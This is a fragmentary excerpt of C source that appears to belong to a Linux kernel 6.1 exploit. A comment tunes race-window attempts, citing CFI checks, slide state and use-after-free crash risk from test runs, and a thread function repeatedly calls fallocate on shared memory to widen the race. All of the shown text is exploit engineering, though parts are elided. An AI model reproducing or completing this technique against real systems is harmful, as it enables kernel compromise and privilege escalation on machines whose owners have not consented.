...
// One CFI verification per armed race window. Empirical finding (husky +
// lynx, 6.1): the TCP route outcome is decided at RUN start, not per
// window — every successful run won on window 1 (husky r1, lynx test1),
// every losing run lost ALL windows (husky r2: 12, lynx: 2400, 2400, 200).
// 12 fresh pages per run all lost too, so re-checking the same page 200x
// only makes runs ~200x longer and raises UAF-crash exposure without
// improving odds. Keep 1: fast runs, retry = new run (new slide/punch
// state). Env override: MAIN_TCP_CFI_ATTEMPTS_PER_PAGE.
...
static void *main_tcp_punch_thread(void *arg) {
  ...
  while (!atomic_load(&main_tcp_punch_stop)) {
    if (fallocate(state->fd, 0, 0, MAIN_TCP_PUNCH_SHMEM_LEN) != 0) {
      pr_warning("main tcp punch fallocate fill errno=%d\n", errno);
      break;
    }
...
/* ---- 6.1 flat-waiter pselect helpers (ported from tokay) ---- */
